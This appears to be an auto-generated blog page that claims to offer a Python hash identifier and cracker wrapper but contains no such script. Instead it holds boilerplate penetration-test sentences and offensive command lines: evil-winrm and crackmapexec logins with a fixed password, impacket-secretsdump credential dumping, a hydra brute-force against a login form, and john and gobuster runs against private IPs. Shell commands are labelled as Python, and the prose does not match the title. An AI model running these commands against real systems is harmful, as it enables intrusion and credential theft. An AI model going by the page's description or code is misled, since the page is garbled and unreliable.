---
TitleSEO: "Hash Identifier and Cracker Wrapper in Python | ZureFX"
TitlePost: "Hash Identifier and Cracker Wrapper — Python"
Author: "ZureFX"
Description: "A Python script for hash identifier and cracker wrapper. Built for security research and automation."
Keywords: "c, rust, powershell, go, python"
URL: "https://zurefx.github.io/scripting/script-hash-identifier-and-cracker-wrapper-434.html"
URL_IMAGES: ""
Date: "2025-03-23"
Tags: "C, Rust, PowerShell, Go, Python"
Section: "scripting"
Lang: "en"
main_img: "script-hash-identifier-and-cracker-wrapper-434"
Permalink: "/scripting/script-hash-identifier-and-cracker-wrapper-434.html"
BtnLabel: "View Script"
Pick: 0
---
## Overview

### Description

Initial enumeration revealed several interesting open ports on the target. Authentication bypass was achieved through careful manipulation of the login mechanism. The scheduled task ran with elevated privileges and could be abused for escalation.

Built with **Python** for offensive security automation.

### Requirements

- Python
- `hydra`
- `john`
- `john`

## Implementation

### Core Logic

The service account had excessive permissions assigned in Active Directory. Unconstrained delegation was enabled on the compromised machine.

```python
feroxbuster -h
```

The web application was vulnerable to Server-Side Template Injection (SSTI). The target system was identified as running a vulnerable version of the service.

### Helper Functions

Authentication bypass was achieved through careful manipulation of the login mechanism. Group Policy Preferences contained encrypted but recoverable credentials.

```python
evil-winrm -i 10.50.7.63 -u administrator -p 'P@ssw0rd!'
crackmapexec smb 10.55.228.28 -u administrator -p 'P@ssw0rd!' --shares
gobuster dir -u http://10.13.132.173/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

## Usage

### Basic Usage

Lateral movement was facilitated by reusing discovered credentials across services. Privilege escalation was possible due to misconfigured sudo permissions.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.102.221.53
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.50.151.88 http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
gobuster dir -u http://10.72.149.91/ -w /usr/share/wordlists/dirb/common.txt -x php,txt,html
```

### Advanced Options

Unconstrained delegation was enabled on the compromised machine. Token impersonation allowed elevation to SYSTEM privileges on the target. Initial enumeration revealed several interesting open ports on the target.

```bash
impacket-secretsdump administrator:'P@ssw0rd!'@10.26.82.26
crackmapexec smb 10.127.131.92 -u administrator -p 'P@ssw0rd!' --shares
```

## Output

### Example Output

Group Policy Preferences contained encrypted but recoverable credentials. Initial enumeration revealed several interesting open ports on the target.

```
[+] Scanning target...
[+] Found 1 results
[+] Done in 5.35s
```
